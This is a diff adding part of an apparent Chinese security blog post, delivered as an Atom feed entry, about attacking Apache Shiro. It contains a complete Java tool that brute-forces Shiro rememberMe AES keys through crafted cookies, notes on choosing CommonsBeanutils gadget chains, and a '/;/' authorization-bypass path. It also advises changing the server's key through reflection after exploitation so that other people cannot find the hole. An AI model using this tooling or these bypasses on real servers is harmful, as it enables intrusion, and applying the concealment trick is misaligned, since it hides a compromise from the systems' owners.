+ByteSource byteSource = cipherService.encrypt(scBytes, keyBytes);
+byte[] value = byteSource.getBytes();
+</code></pre>
+<p>然后加入到Cookie的remberMe字段中发送</p>
+<pre><code class="language-java">String checkKeyCookie = &quot;rememberMe=&quot; + Base64.encodeToString(value);
+Request loginReq = new Request.Builder()
+    .url(url)
+    .addHeader(&quot;Cookie&quot;, &quot;rememberMe=yanmu5525&quot;)
+    .get()
+    .build();
+</code></pre>
+<p>如果相应头的Set-Cookie字段中包含remember=deleteMe说明不是该密钥</p>
+<p>如果什么都不返回,说明当前key是正确的key</p>
+<pre><code class="language-java">if (checkResponse.header(&quot;Set-Cookie&quot;) == null) {
+    shiro = true;
+    logger.info(&quot;find shiro key: &quot; + key);
+}
+</code></pre>
+<p>实际中可能需要多次这样的请求来确认key</p>
+<pre><code class="language-java">package com.github.yanmu;
+
+import okhttp3.Call;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.Response;
+import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.crypto.CipherService;
+import org.apache.shiro.subject.SimplePrincipalCollection;
+import org.apache.shiro.codec.Base64;
+import org.apache.shiro.util.ByteSource;
+import java.io.*;
+import java.util.ArrayList;
+
+@SuppressWarnings(&quot;all&quot;)
+public class Main {
+    public static byte[] serialize(Object o) {
+        try {
+            ByteArrayOutputStream aos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(aos);
+            oos.writeObject(o);
+            oos.flush();
+            oos.close();
+            return aos.toByteArray();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return null;
+    }
+    public static String start(OkHttpClient client,String url,String filepath) throws Exception {
+        File file = new File(filepath);
+        BufferedReader bufferedReader = new BufferedReader(new FileReader(file));
+        ArrayList&lt;String&gt; arrayList = new ArrayList&lt;&gt;();
+        String str;
+        while ((str= bufferedReader.readLine())!=null){
+            arrayList.add(str);
+        }
+        bufferedReader.close();
+        for (String key : arrayList) {
+            SimplePrincipalCollection sc = new SimplePrincipalCollection();
+            byte[] scBytes = serialize(sc);
+            byte[] keyBytes = Base64.decode(key);
+            CipherService cipherService = new AesCipherService();
+            ByteSource byteSource = cipherService.encrypt(scBytes, keyBytes);
+            byte[] value = byteSource.getBytes();
+            String checkKeyCookie = &quot;rememberMe=&quot; + Base64.encodeToString(value);
+            Request loginReq = new Request.Builder()
+                .url(url)
+                .addHeader(&quot;Cookie&quot;, &quot;rememberMe=yanmu5525&quot;)
+                .get()
+                .build();
+            Call call = client.newCall(loginReq);
+            Response response = call.execute();
+            String respCookie = response.header(&quot;Set-Cookie&quot;);
+            boolean shiro = false;
+            if (respCookie != null &amp;&amp; !respCookie.equals(&quot;&quot;)) {
+                if (respCookie.contains(&quot;rememberMe=deleteMe&quot;)) {
+                    Request checkReq = new Request.Builder()
+                        .url(url)
+                        .addHeader(&quot;Cookie&quot;, checkKeyCookie)
+                        .get()
+                        .build();
+                    Call checkCall = client.newCall(checkReq);
+                    Response checkResponse = checkCall.execute();
+                    if (checkResponse.header(&quot;Set-Cookie&quot;) == null) {
+                        shiro = true;
+                        System.out.println(&quot;find shiro key: &quot; + key);
+                    }
+                    checkResponse.close();
+                }
+            }
+            response.close();
+            if (shiro) {
+                return key;
+            }
+        }
+        return null;
+    }
+    public static void main(String[] args) throws Exception {
+        OkHttpClient okHttpClient = new OkHttpClient();
+        String start = start(okHttpClient, &quot;http://127.0.0.1:8080/&quot;, &quot;keys.txt&quot;);
+        if (start==null || start.equals(&quot;&quot;)) {
+            System.out.println(&quot;not find key&quot;);
+        }
+    }
+    
+}
+</code></pre>
+<p>发现成功读取到了环境中的key<br>
+<img src="https://pyroxenites.github.io/post-images/1650455173812-ec1f60a5-8f9f-4096-ba74-c561b2d0fa1a.png" alt="image.png" loading="lazy"></p>
+<blockquote>
+<p>代码只做演示</p>
+</blockquote>
+<h3 id="有什么办法让shiro洞被别人挖不到">有什么办法让Shiro洞被别人挖不到</h3>
+<p>发现shiro发序列化漏洞的时候,可以改其中的key,通过已经存在的反序列化可以执行代码<br>
+反射改了RememberMeManager中的key即可</p>
+<blockquote>
+<p>但会导致已登录用户失效,新用户不用影响</p>
+</blockquote>
+<h3 id="shiro反序列化gadget选择有什么坑吗">Shiro反序列化Gadget选择有什么坑吗</h3>
+<ol>
+<li>默认不包含CC链,包含CB1链</li>
+<li>用不同版本的CB1链会导致出错</li>
+</ol>
+<blockquote>
+<p>反序列化时会计算 服务器端反序列化对应类的serialVersionUID 值跟序列化数据里面的 serialVersionUID 值进行比对，如果一样则可以完成反序列化，不一样则会抛出错误，Shiro依赖的版本是Commons-Beanutils1.8.3，所以为了保证serialVersionUID值一样构造payload时也用Commons-Beanutils1.8.3版本</p>
+</blockquote>
+<figure data-type="image" tabindex="14"><img src="https://pyroxenites.github.io/post-images/1647564579540-ceb1d69b-958c-4dba-ab3c-e0c1b56190ac.png" alt="FqRf5kryw8ZlDmM2GDrc-_QM2jd9.png" loading="lazy"></figure>
+<h3 id="shiro权限绕过问题">shiro权限绕过问题</h3>
+<blockquote>
+<p>版本:1.5.3之前<br>
+shiro＋spring</p>
+</blockquote>
+<p>主要是和Spring配合时候的问题<br>
+例如/;/test/admin/page问题<br>
+在Tomcat判断/;test/admin/page为test应用下的/admin/page路由<br>
+进入到Shiro时被;截断被认作为/<br>
+再进入Spring时又被正确处理为test应用下的/admin/page路由<br>
+最后导致shiro的权限绕过</p>
+<p>测试demo</p>
+<pre><code class="language-java">https://github.com/l3yx/springboot-shiro
+</code></pre>
+]]></content>
+    </entry>
+</feed>
